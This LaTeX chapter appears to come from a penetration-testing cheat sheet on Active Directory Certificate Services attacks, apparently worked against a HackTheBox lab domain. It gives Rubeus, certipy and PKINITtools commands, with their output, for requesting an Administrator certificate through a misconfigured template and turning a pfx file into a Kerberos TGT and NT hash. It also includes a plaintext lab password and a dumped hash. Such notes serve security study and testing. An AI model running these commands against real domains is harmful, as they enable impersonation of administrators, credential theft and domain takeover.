\chapter{ADCS attacks}

See~\ref{windows:adcs:intro} for knowledge and See~\ref{windows:adcs:enum} for
enumeration

\section{Authentication}
\subsection{From pfx to TGT}

\subsubsection{On windows}

\begin{verbatim}
Rubeus.exe asktgt /user:<SAM> /certificate:<pfx path> /password:<password>
\end{verbatim}

\subsubsection{From Linux}
Using \verb+certipy+:
\begin{verbatim}
$ certipy auth -pfx administrator.pfx -username Administrator -domain sequel.htb  -dc-ip 10.10.11.202
Certipy v4.3.0 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
\end{verbatim}


Using \href{https://github.com/dirkjanm/PKINITtools}{PKINITtools}:
\begin{verbatim}
$ gettgtpkinit -cert-pfx /tmp/administrator.pfx -dc-ip 10.10.11.202 sequel.htb/Administrator /tmp/test.cache
\end{verbatim}

\input{ad/adcs/theft}
\input{ad/adcs/account}
\input{ad/adcs/escalation}
\input{ad/adcs/domain}





\section{Notes}
\begin{verbatim}
$ certipy req -target 10.10.11.202 -dc-ip 10.10.11.202 -u Ryan.Cooper@sequel.htb -p NuclearMosquito3 -ca 'sequel-DC-CA' -template 'UserAuthentication' -upn 'Administrator@sequel.htb'
Certipy v4.3.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 16
[*] Got certificate with UPN 'Administrator@sequel.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
\end{verbatim}


\section{Links}
\begin{itemize}
    \item 
        \href{https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf}{Certified Pre-Owned}
    \item 
        \url{https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6}
    \item
        \url{https://www.thehacker.recipes/ad/movement/ad-cs}
\end{itemize}
